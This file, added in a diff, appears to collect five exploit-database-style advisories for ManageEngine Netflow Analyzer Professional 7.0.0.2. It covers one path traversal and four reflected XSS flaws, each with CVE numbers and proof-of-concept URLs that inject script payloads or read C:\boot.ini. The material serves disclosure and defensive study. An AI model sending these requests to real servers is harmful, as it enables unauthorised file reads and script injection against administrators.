@@ -1,0 +1,154 @@
+<!--
+# Exploit Title: Path traversal vulnerability in Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Date: 17-02-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://www.manageengine.com/products/netflow/?doc
+# Software Link: https://www.manageengine.com/products/netflow/?doc
+# Version: Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Tested on: all
+# CVE : CVE-2019-8925
+# Category: webapps
+ 
+1. Description
+   
+An issue was discovered in Zoho ManageEngine Netflow Analyzer Professional 7.0.0.2. An Absolute Path Traversal vulnerability in the Administration zone, in /netflow/servlet/CReportPDFServlet (via the parameter schFilePath), allows remote authenticated users to bypass intended SecurityManager restrictions and list a parent directory via any file name, such as a schFilePath=C:\boot.ini value.
+ 
+   
+2. Proof of Concept
+
+Original request: http://X.X.X.X:8080/netflow/servlet/CReportPDFServlet?pdf=true&schFilePath=C:\AdventNet\ME\NetFlow\help\ciscoQoS.pdf
+ 
+http://X.X.X.X:8080/netflow/servlet/CReportPDFServlet?pdf=true&schFilePath=C:\boot.ini
+
+3. Solution:
+   
+The product is discontinued. Update to last version this product.
+
+-->
+
+
+<!--
+# Exploit Title: Cross Site Scripting in Zoho ManageEngine Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Date: 31-01-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://www.manageengine.com/products/netflow/?doc
+# Software Link: https://www.manageengine.com/products/netflow/?doc
+# Version: Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Tested on: all
+# CVE : CVE-2019-8926
+# Category: webapps
+ 
+1. Description
+ 
+An issue was discovered in Zoho ManageEngine Netflow Analyzer Professional 7.0.0.2. XSS exists in the Administration zone /netflow/jspui/popup1.jsp file via these GET parameters: bussAlert, customDev, and selSource.
+
+   
+2. Proof of Concept
+ 
+http://localhost:8080/netflow/jspui/popup1.jsp?selSource=2&customDev=truer93f1%22%3e%3cscript%3ealert(1)%3c%2fscript%3efc8z7&bussAlert=true
+
+Parameters: bussAlert, customDev and selSource
+
+
+3. Solution:
+   
+Update to last version this product.
+Patch: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules
+
+
+-->
+
+
+<!--
+# Exploit Title: Cross Site Scripting in Zoho ManageEngine Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Date: 31-01-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://www.manageengine.com/products/netflow/?doc
+# Software Link: https://www.manageengine.com/products/netflow/?doc
+# Version: Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Tested on: all
+# CVE : CVE-2019-8927
+# Category: webapps
+ 
+1. Description
+ 
+An issue was discovered in Zoho ManageEngine Netflow Analyzer Professional 7.0.0.2. XSS exists in the Administration zone /netflow/jspui/scheduleConfig.jsp file via these GET parameters: devSrc, emailId, excWeekModify, filterFlag, getFilter, mailReport, mset, popup, rep_schedule, rep_Type, schDesc, schName, schSource, selectDeviceDone, task, val10, and val11.
+
+   
+2. Proof of Concept
+ 
+http://localhost:8080/netflow/jspui/scheduleConfig.jsp?rowIncrement=true&match_flag=true&removeRows=&rep_Type=cust&schSource=interface&rep_schedule=daily&performTask=&disp=&stHr=09&edHr=17&filterFlag=false&selectDeviceDone=&devSrc=auxz6%22%3e%3cscript%3ealert(1)%3c%2fscript%3etqq9idmqry5&popup=false&task=add&f=&mset=&getFilter=false&resetter=true&excWeekModify=&mailReport=true&stH=09&edH=17&boxChecked0=&selCh0=&threshRow=1&schName=www&schDesc=qqq&sourcesel=40&repType=cust&logicOp=AND&sel0=SrcAddr&val10=&rowCount=1&repSchedule=Daily&dailysel1=02&dailysel2=00&dailysel3=1&dmsg=&weeklysel1=1&weeklysel2=02&weeklysel3=00&weeklysel4=3&monthsel1=1&monthsel2=02&monthsel3=00&monthlysel4=5&repGenTime=2019-02-18+14%3A55&oncesel4=1&omsg=&mailreport=mailreport&emailId=
+
+Parameters: devSrc, emailId, excWeekModify, filterFlag, getFilter, mailReport, mset, popup, rep_schedule, rep_Type, schDesc, schName, schSource, selectDeviceDone, task, val10 and val11
+
+
+3. Solution:
+   
+Update to last version this product.
+Patch: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules
+
+
+-->
+
+
+<!--
+# Exploit Title: Cross Site Scripting in Zoho ManageEngine Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Date: 31-01-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://www.manageengine.com/products/netflow/?doc
+# Software Link: https://www.manageengine.com/products/netflow/?doc
+# Version: Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Tested on: all
+# CVE : CVE-2019-8928
+# Category: webapps
+ 
+1. Description
+ 
+An issue was discovered in Zoho ManageEngine Netflow Analyzer Professional 7.0.0.2. XSS exists in /netflow/jspui/userManagementForm.jsp via these GET parameters: authMeth, passWord, pwd1, and userName.
+
+   
+2. Proof of Concept
+ 
+http://localhost:8080/netflow/jspui/userManagementForm.jsp?moveLR=&moveRL=&moveLRIP=&moveRLIP=&moveLRBuss=&moveRLBuss=&addField=&authMeth=fgcuh%3e%3cscript%3ealert(1)%3c%2fscript%3eyxcpve1able&createRadUser=false&radSet=&userName=qqq&radiusUser=Authenticate+locally&pwd1=qqqqqq&passWord=qqqqqq&priv=Guest
+
+Parameters: authMeth, passWord, pwd1 and userName
+
+
+3. Solution:
+   
+Update to last version this product.
+Patch: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules
+
+
+-->
+
+
+<!--
+# Exploit Title: Cross Site Scripting in Zoho ManageEngine Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Date: 31-01-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://www.manageengine.com/products/netflow/?doc
+# Software Link: https://www.manageengine.com/products/netflow/?doc
+# Version: Netflow Analyzer Professional v7.0.0.2 Administration zone
+# Tested on: all
+# CVE : CVE-2019-8929
+# Category: webapps
+ 
+1. Description
+ 
+An issue was discovered in Zoho ManageEngine Netflow Analyzer Professional 7.0.0.2. XSS exists in the Administration zone /netflow/jspui/selectDevice.jsp file in these GET parameters: param and rtype.
+   
+2. Proof of Concept
+ 
+http://localhost:8080/netflow/jspui/selectDevice.jsp?rtype=collopts&param=g3oxp%22%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C!--q5uad
+
+Parameters: param and rtype
+
+
+3. Solution:
+   
+Update to last version this product.
+Patch: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules
+
+
+-->
